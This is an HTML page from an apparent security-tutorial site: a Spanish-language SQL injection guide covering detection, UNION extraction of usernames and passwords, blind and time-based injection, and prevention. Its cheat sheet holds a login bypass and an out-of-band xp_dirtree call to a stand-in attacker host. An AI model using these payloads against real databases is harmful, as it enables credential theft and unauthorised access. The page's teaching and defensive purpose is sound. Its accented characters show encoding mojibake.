<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Theory - SQL Injection</title>
    <link rel="stylesheet" href="../../style.css">
</head>
<body>

    <header>
    <nav class="navbar global-nav">
            <a href="../../index.html#index" class="nav-logo" id="nav-logo">
                <span class="wave">üõ°Ô∏è</span> AppSec in a Nutshell
            </a>
            <ul>
                <li class="dropdown">
                    <a href="../../index.html#web-security-index" id="web-security-link"><span>üîí</span> Web Security</a>
                    <ul class="dropdown-content">
                        <li><a href="../../WebSecurity/xss/TheoryXSS.html" id="xss-link"><span>üß¨</span> XSS</a></li>
                        <li><a href="../../WebSecurity/sqlInjection/TheorySqli.html" id="sql-injection-link"><span>üíæ</span> SQL Injection</a></li>
                    </ul>
                </li>
                <li><a href="../../index.html#devsecops"><span>‚öôÔ∏è</span> DevSecOps</a></li>
                <li><a href="../../index.html#design-security"><span>üé®</span> Design and Security</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <div class="layout">
            <aside class="sidebar">
                <div id="sql-index"></div>
            </aside>

            <div class="content-area">
                <section class="card" id="intro-basics">
                    <h2>1. Introducci√≥n y conceptos b√°sicos</h2>
                    <blockquote>
                        Documento t√©cnico y pr√°ctico pensado para pentesters, desarrolladores y equipos de seguridad. Profundiza en detecci√≥n, explotaci√≥n (incluido UNION y blind SQLi), y mitigaci√≥n.
                    </blockquote>
                    <p><strong>SQL Injection (SQLi)</strong> ocurre cuando una aplicaci√≥n construye consultas SQL con entrada del usuario sin parametrizar correctamente. El atacante puede alterar la consulta original para leer o modificar datos.</p>
                    <ul>
                        <li><strong>In-band (cl√°sica):</strong> extracci√≥n por la misma v√≠a (UNION, error-based).</li>
                        <li><strong>Blind (ciegas):</strong> inferencia por respuestas booleanas o por tiempo.</li>
                        <li><strong>Out-of-band (OAST):</strong> uso de canales externos (DNS/HTTP callbacks).</li>
                    </ul>
                    <p>Los motores (MySQL, PostgreSQL, MSSQL, Oracle) difieren en funciones, comentarios y meta-tablas (p. ej., <code>information_schema</code>, <code>sysobjects</code>).</p>
                </section>

                <section class="card" id="examinar-bd">
                    <h2>2. SQL Injection ‚Äî Examinando la base de datos</h2>
                    <h3>1) Type & version</h3>
                    <p>Conocer el motor facilita elegir payloads correctos.</p>
                    <ul>
                        <li>MySQL: <code>' UNION SELECT version()-- </code></li>
                        <li>PostgreSQL: <code>' UNION SELECT version()-- </code></li>
                        <li>MSSQL: <code>' UNION SELECT @@version-- </code></li>
                    </ul>
                    <h3>2) Listar tablas y columnas</h3>
                    <pre><code>-- MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Enumeraci√≥n v√≠a UNION
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</code></pre>
                    <h3>3) Detecci√≥n de vulnerabilidades</h3>
                    <ul>
                        <li>Probar comillas: <code>1'</code>; booleanos: <code>1' AND 1=1--</code> vs <code>1' AND 1=2--</code>.</li>
                        <li>Comentarios: <code>--</code>, <code>#</code> (MySQL), <code>/* ... */</code>.</li>
                        <li>Contextos: n√∫meros (sin comillas), cadenas (cerrar comillas), <code>ORDER BY</code>, <code>LIMIT</code>.</li>
                    </ul>
                </section>

                <section class="card" id="union-attacks">
                    <h2>3. SQL Injection ‚Äî ataques UNION</h2>
                    <h3>Paso 1: Determinar n√∫mero de columnas</h3>
                    <pre><code>-- ORDER BY
/product?id=1 ORDER BY 1--
/product?id=1 ORDER BY 2--

-- UNION con NULLs
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
</code></pre>
                    <h3>Paso 2: Encontrar columnas visibles/√∫tiles</h3>
                    <p>Inyecta una cadena en cada posici√≥n para detectar d√≥nde aparece en la p√°gina: <code>UNION SELECT 'a',NULL,NULL</code>.</p>
                    <h3>Paso 3: Recuperar datos</h3>
                    <pre><code>' UNION SELECT username, password FROM users--
-- Si hay m√°s columnas, rellena con NULL: UNION SELECT username, NULL, password--
</code></pre>
                    <h3>Paso 4: M√∫ltiples valores en una columna</h3>
                    <pre><code>-- MySQL
UNION SELECT CONCAT(username, ':', password) FROM users--
-- PostgreSQL
UNION SELECT username || ':' || password FROM users--
-- Agregaci√≥n
UNION SELECT GROUP_CONCAT(username, ':', password) FROM users--
</code></pre>
                    <p><strong>Notas:</strong> usa <code>NULL</code> para casar tipos; castea a texto si el motor lo requiere.</p>
                </section>

                <section class="card" id="blind-sqli">
                    <h2>4. Blind SQL Injection</h2>
                    <h3>Boolean-based</h3>
                    <pre><code>?id=1 AND (
  SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin'
)='a'--
</code></pre>
                    <h3>Error-based</h3>
                    <pre><code>1' AND (
  SELECT 1 FROM (
    SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x
    FROM information_schema.tables GROUP BY x
  ) a
)--
</code></pre>
                    <h3>Time-based</h3>
                    <pre><code>-- MySQL
?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
-- PostgreSQL: pg_sleep(5)
-- MSSQL: WAITFOR DELAY '0:0:5'
</code></pre>
                    <h3>OAST</h3>
                    <p>Uso de canales externos (DNS/HTTP callbacks) para exfiltraci√≥n. Requiere que la BD pueda resolver nombres.</p>
                </section>

                <section class="card" id="prevenir-sqli">
                    <h2>5. C√≥mo prevenir SQL Injection</h2>
                    <ol>
                        <li><strong>Consultas parametrizadas / Prepared Statements.</strong></li>
                        <li><strong>ORMs</strong> (evita raw queries sin par√°metros).</li>
                        <li><strong>Validaci√≥n / normalizaci√≥n</strong> de entrada (whitelists).</li>
                        <li><strong>Escapado correcto</strong> si no hay par√°metros (driver-specific).</li>
                        <li><strong>M√≠nimo privilegio</strong> en la cuenta de BD.</li>
                        <li><strong>Errores</strong> no detallados en producci√≥n.</li>
                        <li><strong>WAF</strong> como defensa en profundidad.</li>
                        <li><strong>Registro/monitorizaci√≥n</strong> de consultas an√≥malas.</li>
                        <li><strong>Cifrado</strong> y hashing robusto (bcrypt/argon2).</li>
                    </ol>
                </section>

                <section class="card" id="cheat-sheet">
                    <h2>6. Cheat sheet (resumen r√°pido)</h2>
                    <h3>Comentarios</h3>
                    <ul>
                        <li>MySQL: <code>-- </code> o <code>#</code> (nota: <code>-- </code> requiere espacio)</li>
                        <li>MSSQL/Oracle: <code>--</code>; Multi-line: <code>/* ... */</code></li>
                    </ul>
                    <h3>Pruebas b√°sicas</h3>
                    <ul>
                        <li><code>1' OR '1'='1'-- </code> (bypass)</li>
                        <li><code>' OR 'x'='x</code> (boolean test)</li>
                    </ul>
                    <h3>Columnas y UNION</h3>
                    <ul>
                        <li><code>ORDER BY 1--</code>, <code>UNION SELECT NULL--</code>, etc.</li>
                        <li>MySQL ejemplo: <code>-1' UNION SELECT null,version()-- </code></li>
                    </ul>
                    <h3>Blind</h3>
                    <ul>
                        <li>Boolean: <code>SUBSTRING(...)=...</code></li>
                        <li>Time: <code>SLEEP(5)</code>, <code>pg_sleep(5)</code>, <code>WAITFOR DELAY</code></li>
                    </ul>
                    <h3>OAST</h3>
                    <p>MSSQL: <code>exec master..xp_dirtree \\attacker.com\share</code></p>
                </section>

                <section class="card" id="referencias">
                    <h2>7. Referencias</h2>
                    <ul>
                        <li>PortSwigger Web Security Academy ‚Äî labs y gu√≠as de SQL Injection.</li>
                        <li>OWASP Top 10 ‚Äî Inyecci√≥n SQL.</li>
                        <li>Documentaci√≥n de MySQL, PostgreSQL, Microsoft SQL Server, Oracle.</li>
                    </ul>
                    <hr>
                    <p><em>Aviso legal:</em> Usa estas t√©cnicas s√≥lo con autorizaci√≥n expresa.</p>
                </section>
            </div>
        </div>

        <script src="../../loadHeader.js"></script>
        <script src="../../sqliIndex.js"></script>
        <script>
            (async function(){
                if(window.loadPartial){
                    await window.loadPartial('sql-index','partials/sqlinjection-index.html');
                    if(window.initSqliIndex) window.initSqliIndex();
                }
            })();
        </script>
    </main>

</body>
</html>
